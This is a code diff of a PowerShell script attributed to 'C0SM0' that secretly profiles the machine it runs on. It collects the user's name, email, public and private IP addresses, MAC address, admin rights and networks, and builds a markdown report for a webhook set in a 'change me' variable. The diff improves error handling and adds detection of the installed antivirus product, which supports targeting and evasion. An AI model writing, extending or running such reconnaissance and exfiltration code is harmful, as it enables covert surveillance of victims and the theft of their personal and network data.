@@ -2,7 +2,7 @@
 # created by : C0SM0
 
 # change me
-$webhook = "WEBHOOK"
+$webhook = "WEBHOOK HERE"
 
 # variables
 $account = $env:userprofile.Split('\')[2]
@@ -58,11 +58,12 @@ function Get-email {
     }
 
     # Write Error is just for troubleshooting
-    catch {Write-Error "An email was not found"
-    return "No Email Detected"
-    -ErrorAction SilentlyContinue
+    catch {
+        Write-Error "An email was not found"
+        return "No Email Detected"
     }
 }
+
 
 function Get-IP-Information {
     $ipinfo = curl.exe "https://ipinfo.io" | ConvertFrom-Json
@@ -72,7 +73,7 @@ function Get-IP-Information {
 
 function Get-AntivirusSolution {
     try {
-        $Antivirus = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
+        $Antivirus = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -ErrorAction Stop
         if ($Antivirus) {
             $AntivirusSolution = $Antivirus.displayName
         }
@@ -81,11 +82,12 @@ function Get-AntivirusSolution {
         }
     }
     catch {
-        Write-Error "Unable to get Antivirus Solution"
-        return "NA" -ErrorAction SilentlyContinue
+        Write-Error "Unable to get Antivirus Solution: $_"
+        $AntivirusSolution = "NA"
     }
     return $AntivirusSolution
 }
+
 
 
 
@@ -122,6 +124,7 @@ function user_markdown {
     $full_name = Get-fullName
     $email = Get-email
     $is_admin = (Get-LocalGroupMember 'Administrators').Name -contains "$env:COMPUTERNAME\$env:USERNAME"
+    $antivirus = Get-AntivirusSolution
 
     # create markdown content
     $content = @"
@@ -140,6 +143,9 @@ function user_markdown {
 - Public : $public
 - Private : $private
 - MAC : $MAC
+
+## PC Information
+- Antivirus : $antivirus
 
 ## Connected Networks
 "@
